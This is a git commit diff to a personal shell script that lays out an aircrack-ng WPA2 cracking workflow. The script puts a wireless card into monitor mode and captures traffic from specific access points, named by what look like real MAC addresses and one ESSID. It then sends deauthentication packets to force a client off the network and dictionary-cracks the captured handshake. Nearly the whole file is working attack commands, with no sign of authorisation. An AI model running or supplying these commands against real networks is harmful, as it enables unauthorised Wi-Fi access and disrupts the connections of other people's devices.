0aac183954708c8140cc38b30ad40a6cca460859
rrrgh <rrrgh@localhost.bit>
2015-03-14 20:22:08 +1000

    aircrk test

--- aircrk/aircrk-ng.sh
+++ aircrk/aircrk-ng.sh
@@ -1,19 +1,18 @@
 #ifconfig
-
 airmon-ng check kill
 ifconfig wlan0 down
 #airrmon-ng start wlan0 (-r?)
 airmon-ng start wlan0
-
 airodump-ng mon0
 
-#airodump-ng mon0 -c № --bssid 00:00:00:00:00 -w /root/wpa2psk
-airodump-ng mon0 --bssid C8:E7:D8:08:6D:52 -w /root/wpa2psk
+iwconfig mon0 channel 3
 
-#aireplay-ng -0 0 -a -BSSID- -c -STATION- mon0
-aireplay-ng -0 0 -a C8:E7:D8:08:6D:52 -c -STATION- mon0
+airodump-ng mon0 -c [ChannelNo.] --bssid 00:00:00:00:00 -w airodump-ng
 
-aircrack-ng /root/wpa2psk-01.cap -w /root/psswd-arcrk-ng
+#aireplay-ng -0 2 -a [BSSID] -c [STATION] mon0
+aireplay-ng -0 2 -a C8:E7:D8:08:6D:52 -c [STATION] mon0
+
+aircrack-ng airodump-ng-01.cap -w psswd-aircrk-ng
 
 #If you are using VMware, Virtual box, or any Virtual application you will need to use an external USB WIFI card capable of packet injection. The WIFI card I use with and without my VMware is listed bellow. 
 #USE ctrl+c TO STOP THE PROGRAM AND GET YOUR COMMAND PROMPT BACK
@@ -37,5 +36,5 @@ sudo airodump-ng -c 7 -w ardmp-ng.ot --bssid 38:83:45:CA:47:B4 mon0
 Please specify an ESSID (-e)
 
 sudo aireplay-ng --ignore-negative-one -0 2 -a 38:83:45:CA:47:B4 -c 88:CB:87:5C:B5:CD mon0 -e TP-LINK_CA47B4
-aircrack-ng -w psswd-arcrk-ng -b 38:83:45:CA:47:B4 ardmp-ng.ot*.cap
+aircrack-ng -w psswd-aircrk-ng -b 38:83:45:CA:47:B4 airodump-ng*.cap
 
